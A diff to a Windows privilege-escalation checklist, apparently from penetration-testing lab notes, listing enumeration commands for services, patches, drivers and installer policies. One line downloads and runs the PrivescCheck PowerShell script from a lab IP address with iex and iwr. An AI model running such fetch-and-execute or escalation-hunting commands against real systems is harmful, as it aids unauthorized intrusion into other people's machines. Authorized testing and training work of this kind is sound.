@@ -30,12 +30,13 @@ functions:
         - [ ] driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
         - [ ] wmic product get name, version, vendor
         - [ ] wmic qfe get Caption, Description, HotFixID, InstalledOn
-        - [ ] wmic service get name,displayname,pathname,startmode | findstr /i "auto"  #-- icacls to determine if the directory is writable
+        - [ ] wmic service get name,displayname,pathname,startmode | findstr /i "auto"  #-- icacls to determine if the directory is writable.
+        - [ ] wmic service list full
         - [ ] mountvol
         - [ ] reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
         - [ ] reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer   
 
-        - [ ] powershell -c "iex(iwr http://192.168.119.149:8000/Invoke-PrivescCheck.ps1 -usebasicparsing);Invoke-PrivescCheck"
+        - powershell -c "iex(iwr http://192.168.119.149:8000/Invoke-PrivescCheck.ps1 -usebasicparsing);Invoke-PrivescCheck"
 
 resources: |
   https://github.com/itm4n/PrivescCheck
